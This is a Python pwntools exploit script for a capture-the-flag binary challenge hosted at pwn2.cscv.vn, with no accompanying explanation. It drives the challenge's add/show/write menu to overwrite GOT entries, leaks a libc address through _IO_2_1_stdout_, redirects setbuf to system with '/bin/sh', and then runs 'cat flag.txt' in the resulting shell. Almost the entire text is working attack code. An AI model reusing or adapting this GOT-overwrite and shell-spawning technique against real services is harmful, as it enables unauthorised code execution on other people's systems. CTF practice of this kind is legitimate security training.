#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 3333
HOST = "pwn2.cscv.vn"
exe = context.binary = ELF('./challenge_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0000000000401466
            b* 0x00000000004013B1
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add():
    p.sendlineafter(b'> ', str(1))

def show(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'Index: ', str(idx))

def write(idx, data):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendline(data)

# VARIABLE
exit_got = exe.got.exit
setbuf_got = exe.got.setbuf

# PAYLOAD
for i in range(2):
    add()

payload = b'\0'*0x28 + p64(0x41) + p64(1) + p64(exit_got)
write(0, payload)

payload = p64(0) + p64(0x10)
write(0x4010a0, payload)

payload = b'\0'*0x28 + p64(0x41) + p64(1) + p64(0x404050)
write(0, payload)

show(0x10)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))
setbuf = libc.sym.setbuf

payload = b'\0'*0x28 + p64(0x41) + p64(1) + p64(setbuf_got)
write(0, payload)

write(1, b'/bin/sh')

write(setbuf & 0xffffffff, p64(system))

p.sendlineafter(b'> ', str(3))
p.sendlineafter(b'Index: ', str(1))

p.sendline(b'cat flag.txt')

p.interactive()